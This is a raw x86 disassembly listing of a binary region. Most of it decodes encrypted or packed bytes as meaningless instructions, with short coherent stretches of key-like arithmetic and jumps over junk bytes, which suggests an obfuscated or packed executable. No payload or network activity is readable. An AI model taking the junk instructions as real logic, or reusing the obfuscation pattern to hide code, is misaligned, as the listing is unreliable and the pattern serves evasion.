  40512c:	fsubr  DWORD PTR [eax-0x3e57deef]
  405132:	mov    DWORD PTR [ebx-0x42],edx
  405135:	mov    edx,0xa56c0dc7
  40513a:	out    0xcb,eax
  40513c:	push   ebp
  40513d:	scas   eax,DWORD PTR es:[edi]
  40513e:	jns    0x4050d0
  405140:	fdivr  QWORD PTR [edx]
  405142:	mov    al,0xc1
  405144:	stc    
  405145:	(bad)  
  405146:	mov    cl,0x3a
  405148:	ret    0xaa97
  40514b:	repnz scas al,BYTE PTR es:[edi]
  40514d:	rcl    BYTE PTR ds:0x8bfbaf0f,1
  405153:	pop    ebp
  405154:	call   0xd16c298c
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	xor    ebx,DWORD PTR [ebp+ebp*1+0x7e2cf62c]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405121
  40517e:	iret   
  40517f:	xchg   ecx,eax
  405180:	mov    bl,0x48
  405182:	sbb    al,0xbe
  405184:	lahf   
  405185:	push   ss
  405186:	cmc    
  405187:	sbb    DWORD PTR [esi-0x51f0e6f3],0xffffff93
  40518e:	iret   
  40518f:	adc    ecx,edi
  405191:	or     DWORD PTR [ecx],esp
  405193:	aad    0x4f
  405195:	adc    DWORD PTR [eax-0x38],0xffffffb8
  405199:	jecxz  0x40519d
  40519b:	in     eax,0x13
  40519d:	cmp    bh,BYTE PTR [eax+ecx*8-0x10]
  4051a1:	jno    0x40518f
  4051a3:	arpl   WORD PTR [ebx-0x3b],ax
  4051a6:	repz adc cl,ah
  4051a9:	test   dl,ah
  4051ab:	mov    al,ds:0x3595a63e
  4051b0:	inc    edi
  4051b1:	cs adc al,0x3
  4051b4:	pop    edi
  4051b5:	(bad)  
  4051b6:	sbb    bl,BYTE PTR [edx+ebx*8-0x3f1b23c4]
  4051bd:	or     eax,0xaf0c949a
  4051c2:	add    ebx,DWORD PTR [esi-0xb]
  4051c5:	jp     0x4051f4
  4051c7:	lods   al,BYTE PTR ds:[esi]
  4051c8:	sub    esi,DWORD PTR [esi+0x3b]
  4051cb:	mov    esi,0xb0164b2d
  4051d0:	icebp  
  4051d1:	mov    bl,0xf0
  4051d3:	adc    al,0x6
  4051d5:	jp     0x4051b2
  4051d7:	mov    ch,0xd9
  4051d9:	into   
  4051da:	test   al,0xa4
  4051dc:	jle    0x405180
  4051de:	(bad)  [ebx-0x5ff3157]
  4051e4:	fnstenv [bp+0x4b]
  4051e8:	inc    esi
  4051e9:	mov    cl,0x36
  4051eb:	cmp    BYTE PTR [eax],dh
  4051ed:	lock pop esp
  4051ef:	or     al,0x93
  4051f1:	cmp    eax,0x4c7f830d
  4051f6:	dec    eax
  4051f7:	mov    ebx,0xb5e74607
  4051fc:	pusha  
  4051fd:	jnp    0x405232
  4051ff:	pop    ebp
  405200:	lock mov es:0x9d05e342,eax
  405207:	pop    eax
  405208:	ins    BYTE PTR es:[edi],dx
  405209:	dec    esi
  40520a:	mov    esi,0x2cf8613f
  40520f:	adc    ebx,eax
  405211:	jmp    0x4051e9
  405213:	cwde   
  405214:	mov    cl,0x0
  405216:	loope  0x4051ca
  405218:	rcl    DWORD PTR [ebp-0x766645a5],cl
  40521e:	inc    ebx
  40521f:	push   0x8de74f9a
  405224:	xor    DWORD PTR [edx-0x3cd1ea60],0xfc3d3df3
  40522e:	add    eax,0x4cc0ca84
  405233:	mov    ebx,0xe8f95063
  405238:	jns    0x405222
  40523a:	inc    esi
  40523b:	sbb    BYTE PTR [esi],cl
  40523d:	fistp  QWORD PTR [ebx+0x482b614a]
  405243:	outs   dx,DWORD PTR ds:[esi]
  405244:	ror    ebp,cl
  405246:	js     0x40523f
  405248:	call   0xe445:0xc54fe963
  40524f:	mov    esp,0x4fbaf61b
  405254:	repz data16 xlat BYTE PTR cs:[ebx]
  405258:	jb     0x4051e0
  40525a:	shr    ah,1
  40525c:	imul   ebx,DWORD PTR [edi],0x5a5d0ba4
  405262:	cmc    
  405263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405264:	sbb    DWORD PTR [ebp+0x68],edi
  405267:	mov    bh,0x8b
  405269:	dec    esi
  40526a:	sub    BYTE PTR [esi-0x6a5ab73f],dl
  405270:	jge    0x405250
  405272:	cld    
  405273:	das    
  405274:	in     eax,dx
  405275:	aas    
  405276:	(bad)  
  405277:	cmp    BYTE PTR [ebx],dh
  405279:	xor    BYTE PTR [edx-0x1bbaf241],0x42
  405280:	push   esp
  405281:	lds    ecx,FWORD PTR [edi-0x6cda9ae4]
  405287:	inc    edx
  405288:	push   0x967495a1
  40528d:	sbb    eax,0xe4c9a916
  405292:	jae    0x405308
  405294:	sub    eax,0xba24be1d
  405299:	mov    bh,BYTE PTR [edx]
  40529b:	aam    0x28
  40529d:	test   al,0x5b
  40529f:	add    eax,0x7347f78e
  4052a4:	adc    al,0x22
  4052a6:	cmc    
  4052a7:	js     0x40528e
  4052a9:	ins    DWORD PTR es:[edi],dx
  4052aa:	stos   BYTE PTR es:[edi],al
  4052ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ac:	outs   dx,DWORD PTR ds:[esi]
  4052ad:	mov    edi,DWORD PTR [ecx+0x7ba81e64]
  4052b3:	repnz aaa 
  4052b5:	push   esi
  4052b6:	mov    bl,0x50
  4052b8:	cld    
  4052b9:	fstp   DWORD PTR [edi-0x6]
  4052bc:	test   al,0xdf
  4052be:	and    al,0xb0
  4052c0:	jne    0x40533e
  4052c2:	sub    BYTE PTR [ebp+ebx*1+0x69af2c83],0x6e
  4052ca:	mov    edx,0x5de0a7f7
  4052cf:	cmp    BYTE PTR [eax-0x3b629c26],ah
  4052d5:	hlt    
  4052d6:	or     DWORD PTR ds:0x37d881bb,eax
  4052dc:	inc    esp
  4052dd:	mov    ds:0xd44b7b4e,al
  4052e2:	outs   dx,BYTE PTR ds:[esi]
  4052e3:	(bad)  
  4052e4:	fstp   QWORD PTR [ebx]
  4052e6:	jmp    0x125f36bd
  4052eb:	lock gs retf 
  4052ee:	push   eax
  4052ef:	js     0x40535d
  4052f1:	scas   eax,DWORD PTR es:[edi]
  4052f2:	or     BYTE PTR [ecx-0x17801e66],0xfd
  4052f9:	pusha  
  4052fa:	mov    eax,0xfc2b7ae0
  4052ff:	inc    ebp
  405300:	shr    DWORD PTR [edx+ebp*8-0x1953e537],cl
  405307:	adc    eax,DWORD PTR [ebx-0x1e]
  40530a:	add    DWORD PTR [edi-0x6b],ebp
  40530d:	lock xchg edx,eax
  40530f:	adc    BYTE PTR [ecx+esi*8],bl
  405312:	fidiv  WORD PTR [ebp-0x6f]
  405315:	ror    ebx,0x4
  405318:	pop    es
  405319:	add    ebx,edi
  40531b:	nop
  40531c:	xor    BYTE PTR [edi+0x5fd22bb6],cl
  405322:	cmc    
  405323:	fldenv [edx-0x47]
  405326:	stos   BYTE PTR es:[edi],al
  405327:	cs or  al,0x67
  40532a:	sbb    al,0x75
  40532c:	dec    ebx
  40532d:	and    esp,DWORD PTR [edx+0x7b5e2d69]
  405333:	xchg   BYTE PTR [esi+0x6df79dac],bl
  405339:	and    al,0x89
  40533b:	add    ebx,ebx
  40533d:	into   
  40533e:	stos   BYTE PTR es:[edi],al
  40533f:	int3   
  405340:	scas   al,BYTE PTR es:[edi]
  405341:	addr16 mov al,ds:0xe4e3
  405345:	push   edi
  405346:	movnti DWORD PTR [ebx+0x14190666],edx
  40534d:	mov    cl,0xfb
  40534f:	adc    eax,0x87e3598d
  405354:	mov    bh,0x47
  405356:	sbb    cl,BYTE PTR [edx-0x11]
  405359:	jae    0x4052f9
  40535b:	mov    DWORD PTR [edx],edi
  40535d:	shl    BYTE PTR [edx+0x30394777],0x7b
  405364:	sub    edx,DWORD PTR [edi]
  405366:	enter  0x15b5,0xcc
  40536a:	enter  0x2a6,0x1e
  40536e:	and    BYTE PTR [edx+0x58ca8e58],cl
  405374:	jne    0x4053de
  405376:	fs xor bh,al
  405379:	or     eax,0xf5cb9876
  40537e:	cli    
  40537f:	aad    0xd0
  405381:	jo     0x4053ad
  405383:	jmp    0xe79e9268
  405388:	out    dx,al
  405389:	add    dh,BYTE PTR [edi-0x6cf5193c]
  40538f:	pop    ecx
  405390:	iret   
  405391:	xchg   edx,eax
  405392:	jae    0x405412
  405394:	push   ecx
  405395:	ss dec eax
  405397:	(bad)  
  405398:	sbb    DWORD PTR ss:[ebx],esp
  40539b:	inc    ecx
  40539c:	sbb    dl,BYTE PTR [edx-0x6f]
  40539f:	clc    
  4053a0:	js     0x40536a
  4053a2:	dec    ebx
  4053a3:	out    dx,al
  4053a4:	outs   dx,BYTE PTR ds:[esi]
  4053a5:	ret    0xf0af
  4053a8:	cmc    
  4053a9:	fucomip st,st(0)
  4053ab:	imul   edx,ecx,0xc6dbd480
  4053b1:	cmc    
  4053b2:	jmp    0xc7d6:0x5ec45fb4
  4053b9:	cmp    al,cl
  4053bb:	push   ebp
  4053bc:	sub    esp,DWORD PTR [ecx-0x392fdc85]
  4053c2:	scas   al,BYTE PTR es:[edi]
  4053c3:	rcl    DWORD PTR ds:0x7fd1b340,0x31
  4053ca:	or     al,0x59
  4053cc:	iret   
  4053cd:	inc    edx
  4053ce:	xlat   BYTE PTR ds:[ebx]
  4053cf:	xchg   edx,eax
  4053d0:	(bad)  
  4053d1:	mov    al,ds:0xe6ed9386
  4053d6:	mov    edx,0xe4fc6696
  4053db:	xor    ch,BYTE PTR [ecx]
  4053dd:	xchg   edi,eax
  4053de:	test   BYTE PTR [edi-0x7f],0x9b
  4053e2:	xor    eax,0xce7c814d
  4053e7:	sahf   
  4053e8:	xor    BYTE PTR [ecx],0x37
  4053eb:	ror    eax,cl
  4053ed:	mov    gs,WORD PTR [eax+0x6d2c3ff0]
  4053f3:	mov    al,ss:0xccc64058
  4053f9:	push   cs
  4053fa:	fwait
  4053fb:	sbb    DWORD PTR ds:0x54354d08,0xffffffeb
  405402:	or     cl,BYTE PTR [ecx-0x44]
  405405:	sub    al,0x2a
  405407:	adc    bl,ch
  405409:	ret    0x7e17
  40540c:	cdq    
  40540d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40540e:	inc    esi
  40540f:	pop    eax
  405410:	ins    DWORD PTR es:[edi],dx
  405411:	jge    0x4053b6
  405413:	inc    eax
  405414:	mov    esp,ebx
  405416:	fsubr  QWORD PTR [esp+ebp*8-0x5b541667]
  40541d:	sti    
  40541e:	push   0x45
  405420:	aaa    
  405421:	adc    al,0xcd
  405423:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  405425:	test   eax,0x8959a72
  40542a:	xchg   ecx,eax
  40542b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40542c:	arpl   WORD PTR [ebx-0x3fe43672],dx
  405432:	lea    ecx,[ecx]
  405434:	loopne 0x40541c
  405436:	push   0xf2592b2b
  40543b:	xor    DWORD PTR [eax],0xfd70b875
  405441:	mov    edx,0xb0eb7b8c
  405446:	rcl    BYTE PTR [edi+0x42a9aa6f],1
  40544c:	push   0x5bfea0d4
  405451:	push   edx
  405452:	jns    0x40548b
  405454:	fsubr  QWORD PTR [ebp+eiz*4+0x247e046d]
  40545b:	mov    cl,0x56
  40545d:	mov    esi,0x3d7b110f
  405462:	or     BYTE PTR [ebx],bh
  405464:	cli    
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x46c1fbb8]
  405484:	inc    esi
  405485:	rcl    eax,0x2b
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054f8
  40548f:	push   ss
  405490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405491:	gs or  ecx,edx
  405494:	xchg   edi,esi
  405496:	call   0x4a86e10e
  40549b:	jnp    0x4054b0
  40549d:	inc    ebp
  40549e:	(bad)  
  40549f:	ss clc 
  4054a1:	jg     0x4054b3
  4054a3:	adc    DWORD PTR [esi+0x4a8dd7ec],eax
  4054a9:	je     0x405453
  4054ab:	sbb    dl,ah
  4054ad:	dec    edx
  4054ae:	xor    eax,0xf1c601eb
  4054b3:	pop    es
  4054b4:	pop    eax
  4054b5:	mov    WORD PTR [ecx],cs
  4054b7:	scas   eax,DWORD PTR es:[edi]
  4054b8:	out    dx,eax
  4054b9:	push   cs
  4054ba:	add    ecx,ebp
  4054bc:	mov    dh,0x4
  4054be:	dec    esp
  4054bf:	mov    ebx,edx
  4054c1:	jb     0x4054d5
  4054c3:	stos   BYTE PTR es:[edi],al
  4054c4:	cmp    al,0x48
  4054c6:	stos   DWORD PTR es:[edi],eax
  4054c7:	add    DWORD PTR [ebp+0x45],eax
  4054ca:	nop
  4054cb:	inc    edi
  4054cc:	lods   al,BYTE PTR ds:[esi]
  4054cd:	pop    esp
  4054ce:	push   ebp
  4054cf:	fcom   st(1)
  4054d1:	pop    ss
  4054d2:	xor    al,0x30
  4054d4:	mov    ds:0x9618745d,al
  4054d9:	std    
  4054da:	loopne 0x405551
  4054dc:	repz out dx,al
  4054de:	sub    edx,ebx
  4054e0:	repz and BYTE PTR [eax],bl
  4054e3:	scas   al,BYTE PTR es:[edi]
  4054e4:	imul   DWORD PTR [esi]
  4054e6:	sbb    eax,0x1224ab95
  4054eb:	inc    edi
  4054ec:	cli    
  4054ed:	pop    edx
  4054ee:	mov    es,esi
  4054f0:	(bad)  
  4054f1:	mov    bl,0xe2
  4054f3:	das    
  4054f4:	pop    ebx
  4054f5:	fcomp  DWORD PTR [edi+0x46]
  4054f8:	dec    ebx
  4054f9:	jae    0x4054cd
  4054fb:	retf   
  4054fc:	pop    ebx
  4054fd:	mov    ch,0xd4
  4054ff:	adc    esp,DWORD PTR [esi-0x10]
  405502:	adc    eax,0x24d9cb37
  405507:	js     0x4054cc
  405509:	dec    ecx
  40550a:	pop    edi
  40550b:	stc    
  40550c:	cwde   
  40550d:	scas   al,BYTE PTR es:[edi]
  40550e:	cwde   
  40550f:	fsub   QWORD PTR [esi]
  405511:	pop    ebp
  405512:	loop   0x405555
  405514:	mov    edi,0xd17ac819
  405519:	pop    ds
  40551a:	add    dl,BYTE PTR [ebx]
  40551c:	xchg   esi,eax
  40551d:	imul   ecx,DWORD PTR [esp+eiz*4],0x3
  405521:	repz jmp 0x38a7:0x196a9c96
  405529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40552a:	es fucom st(1)
  40552e:	out    0x68,al
  405530:	and    bh,bh
  405532:	adc    eax,0x12bf8dd4
  405537:	pop    edi
  405538:	cmp    bh,bh
  40553a:	add    BYTE PTR [ecx+0x6462e4f5],bh
  405540:	inc    edi
  405541:	jecxz  0x405521
  405543:	mov    cl,0xa5
  405545:	loop   0x40550a
  405547:	sahf   
  405548:	pop    ss
  405549:	sbb    cl,BYTE PTR [edx]
  40554b:	mov    edx,0x969a44f
  405550:	xor    BYTE PTR [edi-0x61de5e74],cl
  405556:	iret   
  405557:	test   eax,0x323fc401
  40555c:	stos   BYTE PTR es:[edi],al
  40555d:	call   DWORD PTR ds:0xe276590d
  405563:	cmp    al,0x59
  405565:	test   al,0x5d
  405567:	xor    al,0x8a
  405569:	pop    ds
  40556a:	or     ah,BYTE PTR [edx+0x65]
  40556d:	ss mov ecx,0xb3570f6b
  405573:	test   eax,0x50d0abc5
  405578:	ds inc ecx
  40557a:	jl     0x40552f
  40557c:	fimul  DWORD PTR [esi+0x5d2f1c92]
  405582:	sbb    eax,0x7068440a
  405587:	mov    ecx,0xe9159672
  40558c:	icebp  
  40558d:	cmp    al,0xb1
  40558f:	mov    DWORD PTR [edx+0x419633f2],ebp
  405595:	push   ebp
  405596:	mov    cl,0xb6
  405598:	push   ss
  405599:	and    al,0xa7
  40559b:	mov    ds:0x5a7f975c,al
  4055a0:	jle    0x405539
  4055a2:	push   es
  4055a3:	jb     0x40556d
  4055a5:	pop    ss
  4055a6:	mov    dl,bh
  4055a8:	jl     0x405591
  4055aa:	(bad)  
  4055ab:	xor    BYTE PTR [esi+eax*2+0x3df23235],dh
  4055b2:	gs or  al,0x7e
  4055b5:	mov    bh,0xff
  4055b7:	jmp    0x40557e
  4055b9:	cmp    DWORD PTR [edx-0x26a5015b],eax
  4055bf:	jns    0x4055fc
  4055c1:	or     BYTE PTR [ebx+edx*8-0x44],ch
  4055c5:	mov    ebx,0x35c7fef8
  4055ca:	shr    BYTE PTR [edx+0x34cf3578],cl
  4055d0:	stos   BYTE PTR es:[edi],al
  4055d1:	mov    cl,BYTE PTR [ebx+edi*1]
  4055d4:	cmc    
  4055d5:	pop    ebp
  4055d6:	xchg   edi,eax
  4055d7:	repnz jecxz 0x40562a
  4055da:	inc    edi
  4055db:	sub    edx,DWORD PTR [edi]
  4055dd:	mov    ebx,0x8ba30637
  4055e2:	test   eax,0x60128a9
  4055e7:	outs   dx,DWORD PTR ds:[esi]
  4055e8:	pop    ss
  4055e9:	lods   eax,DWORD PTR ds:[esi]
  4055ea:	test   BYTE PTR [edi-0x50595bc8],al
  4055f0:	(bad)  
  4055f2:	mov    edx,0xa980861a
  4055f7:	or     al,0x99
  4055f9:	daa    
  4055fa:	lock push edx
  4055fc:	cmp    DWORD PTR [edi+0x58],0x369b2582
  405603:	arpl   WORD PTR [edi],cx
  405605:	mov    ds:0x9710c862,al
  40560a:	outs   dx,DWORD PTR ds:[esi]
  40560b:	mov    esp,0x30ccc1a8
  405610:	sahf   
  405611:	ror    BYTE PTR es:[eax+0x3551c23b],1
  405618:	or     DWORD PTR [edi],0xffffff9b
  40561b:	inc    edi
  40561c:	out    0xdb,eax
  40561e:	retf   
  40561f:	fild   DWORD PTR [eax-0x398da6fd]
  405625:	mov    edx,0x4ad24abb
  40562a:	mov    DWORD PTR [edx+0x8],edx
  40562d:	adc    ch,BYTE PTR [edi-0x6b]
  405630:	xchg   esp,eax
  405631:	and    eax,0xc0a18eb3
  405636:	xchg   ecx,eax
  405637:	daa    
  405638:	xchg   esi,eax
  405639:	and    eax,0xd4fe799
  40563e:	fsub   st(3),st
  405640:	stc    
  405641:	xchg   ebx,eax
  405642:	adc    al,0xa
  405644:	inc    esp
  405645:	iret   
  405646:	out    0x49,eax
  405648:	push   es
  405649:	bound  edx,QWORD PTR [esi]
  40564b:	push   ss
  40564c:	jmp    0x405610
  40564e:	cmp    ch,cl
  405650:	jnp    0x4056d0
  405652:	jg     0x4055e6
  405654:	jne    0x4055e0
  405656:	inc    ecx
  405657:	sub    ecx,edi
  405659:	pop    edi
  40565a:	(bad)  
  40565b:	les    ebx,FWORD PTR [esi+0x54]
  40565e:	les    edi,FWORD PTR [esp+esi*1-0x3a43c693]
  405665:	jae    0x40568d
  405667:	jmp    0x31ffc950
  40566c:	push   esp
  40566d:	cmp    edi,DWORD PTR [ebp+0x3e]
  405670:	cmc    
  405671:	cwde   
  405672:	ret    
  405673:	xor    eax,0x99748c36
  405678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405679:	inc    ecx
  40567a:	pop    eax
  40567b:	shr    DWORD PTR [ecx],1
  40567d:	ins    DWORD PTR es:[edi],dx
  40567e:	dec    ecx
  40567f:	sbb    DWORD PTR [ebx+0x32],0xe8c3b566
  405686:	repz sub eax,0xeb5fab60
  40568c:	call   0x33bd8e0d
  405691:	pop    esi
  405692:	daa    
  405693:	push   esp
  405694:	imul   bh
  405696:	or     esi,eax
  405698:	sbb    esp,DWORD PTR [ebx+0x4bbcfac3]
  40569e:	push   ebp
  40569f:	and    dh,BYTE PTR [esp+eax*2]
  4056a2:	(bad)  
  4056a3:	mov    ebp,0x62eaf346
  4056a8:	hlt    
  4056a9:	xchg   edi,eax
  4056aa:	cmc    
  4056ab:	stc    
  4056ac:	dec    edx
  4056ad:	sub    DWORD PTR [edx+0x36],esp
  4056b0:	xor    eax,ebx
  4056b2:	inc    edx
  4056b3:	mov    esi,DWORD PTR [eax-0x63bbe624]
  4056b9:	call   0xdec7:0x85b7bce0
  4056c0:	test   eax,0xf32f5c44
  4056c5:	aas    
  4056c6:	pop    esi
  4056c7:	pushf  
  4056c8:	aam    0xed
  4056ca:	in     al,0xa
  4056cc:	inc    ebp
  4056cd:	xchg   esp,eax
  4056ce:	fst    DWORD PTR [ecx]
  4056d0:	imul   edx,DWORD PTR [ecx+0x70],0xffffff8e
  4056d4:	mov    ds:0x8d211395,eax
  4056d9:	xor    DWORD PTR [eax+0x12],esi
  4056dc:	call   0x984d:0x2642be7
  4056e3:	pop    ebx
  4056e4:	xchg   esi,eax
  4056e5:	test   eax,0x29fad2ea
  4056ea:	or     esp,edi
  4056ec:	scas   al,BYTE PTR es:[edi]
  4056ed:	add    esp,DWORD PTR [esp+eax*4]
  4056f0:	jns    0x405711
  4056f2:	mov    dl,0x86
  4056f4:	popf   
  4056f5:	cmc    
  4056f6:	cld    
  4056f7:	je     0x405750
  4056f9:	cli    
  4056fa:	cmp    DWORD PTR [ecx-0xa],edi
  4056fd:	pop    esi
  4056fe:	add    eax,0xf647314f
  405703:	mov    eax,es
  405705:	adc    DWORD PTR [ecx+0x3b],esp
  405708:	bound  edi,QWORD PTR [ebx+0x5173b6fc]
  40570e:	or     al,0x57
  405710:	jmp    0x5882:0xa122197a
  405717:	ret    
  405718:	dec    eax
  405719:	and    DWORD PTR [esi+edi*1],0xffffffd2
  40571d:	rcl    esp,1
  40571f:	pushf  
  405720:	sar    dl,0x1f
  405723:	jbe    0x4056b6
  405725:	hlt    
  405726:	push   ebx
  405727:	mov    BYTE PTR [esi-0x7a],0xd4
  40572b:	pop    es
  40572c:	(bad)  
  40572d:	xchg   ebx,eax
  40572e:	test   eax,0x7f5a4eae
  405733:	push   es
  405734:	(bad)  
  405735:	or     eax,DWORD PTR [ecx-0x19]
  405738:	mov    dl,BYTE PTR [eax+0x1d]
  40573b:	mov    DWORD PTR [edx],ebp
  40573d:	pop    edx
  40573e:	rol    bl,0x1b
  405741:	fmul   QWORD PTR [edi]
  405743:	out    0x57,al
  405745:	jmp    0x6bd0e822
  40574a:	retf   
  40574b:	mov    fs,WORD PTR [edi]
  40574d:	or     DWORD PTR [esi+0x3],esi
  405750:	pop    edx
  405751:	shr    BYTE PTR [ebp-0x4b0e64c4],cl
  405757:	inc    eax
  405758:	push   ecx
  405759:	lahf   
  40575a:	scas   al,BYTE PTR es:[edi]
  40575b:	jae    0x405749
  40575d:	add    eax,0xaa5cc4ab
  405762:	je     0x405769
  405764:	dec    esp
  405765:	loopne 0x4056fb
  405767:	fs or  al,0x59
  40576a:	pop    ds
  40576b:	and    ecx,DWORD PTR [ebp-0x7c87f9f5]
  405771:	or     edx,eax
  405773:	fdiv   QWORD PTR [ebx]
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43389b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4337a3,0x433783
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4337df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x55
  4057f5:	fsub   QWORD PTR [edx+0x72]
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	push   ds
  405801:	sar    BYTE PTR [eax+0x41082b3c],cl
  405807:	pop    edx
  405808:	mov    esi,DWORD PTR [esp+ecx*2-0x71]
  40580c:	jge    0x40583f
  40580e:	pop    ss
  40580f:	(bad)  [eax+0x20a22cc3]
  405815:	cwde   
  405816:	(bad)  
  405817:	add    al,BYTE PTR [edx+0xdb22081]
  40581d:	cmp    esi,DWORD PTR [ebx-0x515ed564]
  405823:	fstp   TBYTE PTR [esi+esi*4-0x54]
  405827:	sub    DWORD PTR [edx+0x4cc967b7],edx
  40582d:	aaa    
  40582e:	popa   
  40582f:	pop    ss
  405830:	jnp    0x405817
  405832:	add    BYTE PTR [eax],al
  405834:	(bad)  
  405835:	test   DWORD PTR [ebx+ecx*4-0x7b],0x2c65100a
  40583d:	jg     0x405879
  40583f:	std    
  405840:	shl    DWORD PTR [ecx-0x4dc14c82],cl
  405846:	popf   
  405847:	nop
  405848:	repz es push esp
  40584b:	jb     0x40586f
  40584d:	cmp    esp,DWORD PTR [edi+ecx*1]
  405850:	in     eax,dx
  405851:	sbb    al,0x70
  405853:	mov    ds:0xa0280fc3,eax
  405858:	(bad)  
  405859:	call   DWORD PTR [eax+0x3b]
  40585c:	test   BYTE PTR [eax-0x72638973],bl
  405862:	push   ebx
  405863:	loop   0x405825
  405865:	xor    eax,0x6f37ba33
  40586a:	ss cmp ah,dl
  40586d:	iret   
  40586e:	jo     0x4058e7
  405870:	int3   
  405871:	xor    ah,BYTE PTR [edi+0xe87ff46]
  405877:	inc    ecx
  405878:	cmp    al,0xfb
  40587a:	xor    eax,0x84baf53f
  40587f:	loopne 0x405870
  405881:	out    dx,eax
  405882:	call   0x8cba:0x1800561
  405889:	test   al,0x3a
  40588b:	(bad)  
  40588c:	cmp    edx,DWORD PTR [edi+eiz*1-0x5c]
  405890:	out    dx,al
  405891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405892:	sahf   
  405893:	sar    BYTE PTR [ecx],0x3e
  405896:	sub    al,0x33
  405898:	add    al,0xc4
  40589a:	es jmp 0x4f48275
  4058a0:	xor    cl,BYTE PTR [edi+esi*8+0xf]
  4058a4:	dec    ecx
  4058a5:	push   edx
  4058a6:	scas   eax,DWORD PTR es:[edi]
  4058a7:	mov    dl,0xa0
  4058a9:	push   eax
  4058aa:	stc    
  4058ab:	je     0x4058bb
  4058ad:	cld    
  4058ae:	ins    DWORD PTR es:[edi],dx
  4058af:	test   al,0xdd
  4058b1:	pop    ecx
  4058b2:	xor    BYTE PTR [edx],bl
  4058b4:	stc    
  4058b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058b6:	mov    ah,0x48
  4058b8:	popf   
  4058b9:	call   0x8d48:0x274367d7
  4058c0:	nop
  4058c1:	mov    ah,0xbb
  4058c3:	xlat   BYTE PTR ds:[ebx]
  4058c4:	repnz xlat BYTE PTR ds:[ebx]
  4058c6:	(bad)  
  4058c7:	mov    ah,0x35
  4058c9:	loop   0x405867
  4058cb:	aas    
  4058cc:	adc    al,0xa9
  4058ce:	cmc    
  4058cf:	pop    esi
  4058d0:	(bad)  
  4058d1:	gs ins DWORD PTR es:[edi],dx
  4058d3:	mov    ch,0xaa
  4058d5:	adc    al,0x6e
  4058d7:	sbb    eax,0xe253d41a
  4058dc:	cdq    
  4058dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058de:	jae    0x405875
  4058e0:	lods   eax,DWORD PTR ds:[esi]
  4058e1:	aaa    
  4058e2:	push   ds
  4058e3:	data16 mov bl,0xae
  4058e6:	ja     0x405954
  4058e8:	jg     0x40593e
  4058ea:	mov    ds:0x919104b4,al
  4058ef:	adc    al,0x69
  4058f1:	cmp    eax,0xbf2e92ce
  4058f6:	cmp    dl,BYTE PTR [ecx-0x3d4ebd21]
  4058fc:	jecxz  0x405970
  4058fe:	jg     0x405899
  405900:	aaa    
  405901:	sbb    BYTE PTR [eax-0x76],al
  405904:	(bad)  
  405905:	mov    ch,0xc
  405907:	jmp    0x60e3:0x790a97c0
  40590e:	push   eax
  40590f:	jns    0x405940
  405911:	std    
  405912:	pop    eax
  405913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405914:	push   ecx
  405915:	enter  0x868c,0x2c
  405919:	jmp    0x40598c
  40591b:	mov    BYTE PTR [edi+0x3ec4eea2],bh
  405921:	cmp    BYTE PTR [ebp+0x35daae66],0x2
  405928:	add    dh,dl
  40592a:	mov    ds,WORD PTR [esi-0x7d]
  40592d:	cmc    
  40592e:	sbb    eax,0xd36f1d75
